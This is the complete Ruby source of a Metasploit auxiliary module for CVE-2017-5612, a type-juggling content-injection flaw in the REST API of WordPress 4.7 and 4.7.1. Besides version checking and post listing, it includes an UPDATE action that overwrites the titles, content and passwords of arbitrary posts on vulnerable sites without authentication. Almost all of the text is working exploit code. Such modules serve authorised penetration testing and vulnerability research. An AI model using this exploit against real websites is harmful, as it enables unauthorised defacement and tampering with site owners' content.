##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress REST API Content Injection',
      'Description'    => %q{
        This module exploits a content injection vulnerability in WordPress
        versions 4.7 and 4.7.1 via type juggling in the REST API.
      },
      'Author'         => [
        'Marc Montpas', # Vulnerability discovery
        'wvu'           # Metasploit module
      ],
      'References'     => [
        ['CVE' , '2017-5612'],
        ['WPVDB', '8734'],
        ['URL',   'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html'],
        ['URL',   'https://secure.php.net/manual/en/language.types.type-juggling.php'],
        ['URL',   'https://developer.wordpress.org/rest-api/using-the-rest-api/discovery/'],
        ['URL',   'https://developer.wordpress.org/rest-api/reference/posts/']
      ],
      'DisclosureDate' => '2017-02-01',
      'License'        => MSF_LICENSE,
      'Actions'        => [
        ['LIST',   'Description' => 'List posts'],
        ['UPDATE', 'Description' => 'Update post']
      ],
      'DefaultAction'  => 'LIST'
    ))

    register_options([
      OptInt.new('POST_ID',          [false, 'Post ID (0 for all)', 0]),
      OptString.new('POST_TITLE',    [false, 'Post title']),
      OptString.new('POST_CONTENT',  [false, 'Post content']),
      OptString.new('POST_PASSWORD', [false, 'Post password (\'\' for none)'])
    ])

    register_advanced_options([
      OptInt.new('PostCount',     [false, 'Number of posts to list', 100]),
      OptString.new('SearchTerm', [false, 'Search term when listing posts'])
    ])
  end

  def check_host(_ip)
    if (version = wordpress_version)
      version = Gem::Version.new(version)
    else
      return Exploit::CheckCode::Safe
    end

    vprint_status("WordPress #{version}: #{full_uri}")

    if version.between?(Gem::Version.new('4.7'), Gem::Version.new('4.7.1'))
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Detected
    end
  end

  def run_host(_ip)
    if !wordpress_and_online?
      print_error("WordPress not detected at #{full_uri}")
      return
    end

    case action.name
    when 'LIST'
      do_list
    when 'UPDATE'
      do_update
    end
  end

  def do_list
    posts_to_list = list_posts

    if posts_to_list.empty?
      print_status("No posts found at #{full_uri}")
      return
    end

    tbl = Rex::Text::Table.new(
      'Header'  => "Posts at #{full_uri} (REST API: #{get_rest_api})",
      'Columns' => %w{ID Title URL Password}
    )

    posts_to_list.each do |post|
      tbl << [
        post[:id],
        Rex::Text.html_decode(post[:title]),
        post[:url],
        post[:password] ? 'Yes' : 'No'
      ]
    end

    print_line(tbl.to_s)
  end

  def do_update
    posts_to_update = []

    if datastore['POST_ID'] == 0
      posts_to_update = list_posts
    else
      posts_to_update << {id: datastore['POST_ID']}
    end

    if posts_to_update.empty?
      print_status("No posts to update at #{full_uri}")
      return
    end

    posts_to_update.each do |post|
      res = update_post(post[:id],
        title:    datastore['POST_TITLE'],
        content:  datastore['POST_CONTENT'],
        password: datastore['POST_PASSWORD']
      )

      post_url = full_uri(wordpress_url_post(post[:id]))

      if res && res.code == 200
        print_good("SUCCESS: #{post_url} (Post updated)")
      elsif res && (error = res.get_json_document['message'])
        print_error("FAILURE: #{post_url} (#{error})")
      end
    end
  end

  def list_posts
    posts = []

    res = send_request_cgi({
      'method'     => 'GET',
      'uri'        => normalize_uri(get_rest_api, 'posts'),
      'vars_get'   => {
        'per_page' => datastore['PostCount'],
        'search'   => datastore['SearchTerm']
      }
    }, 3.5)

    if res && res.code == 200
      res.get_json_document.each do |post|
        posts << {
          id:       post['id'],
          title:    post['title']['rendered'],
          url:      post['link'],
          password: post['content']['protected']
        }
      end
    elsif res && (error = res.get_json_document['message'])
      vprint_error("Failed to list posts: #{error}")
    end

    posts
  end

  def update_post(id, opts = {})
    payload = {}

    payload[:id]       = "#{id}#{Rex::Text.rand_text_alpha(8)}"
    payload[:title]    = opts[:title] if opts[:title]
    payload[:content]  = opts[:content] if opts[:content]
    payload[:password] = opts[:password] if opts[:password]

    send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(get_rest_api, 'posts', id),
      'ctype'  => 'application/json',
      'data'   => payload.to_json
    }, 3.5)
  end

  def get_rest_api
    return @rest_api if @rest_api

    res = send_request_cgi!({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path)
    }, 3.5)

    if res && res.code == 200
      @rest_api = parse_rest_api(res)
    end

    @rest_api ||= wordpress_url_rest_api
  end

  def parse_rest_api(res)
    rest_api = nil

    link = res.headers['Link']
    html = res.get_html_document

    if link =~ %r{^<(.*)>; rel="https://api\.w\.org/"$}
      rest_api = route_rest_api($1)
      vprint_status('REST API found in Link header')
    elsif (xpath = html.at('//link[@rel = "https://api.w.org/"]/@href'))
      rest_api = route_rest_api(xpath)
      vprint_status('REST API found in HTML document')
    end

    rest_api
  end

  def route_rest_api(rest_api)
    normalize_uri(path_from_uri(rest_api), 'wp/v2')
  end
end
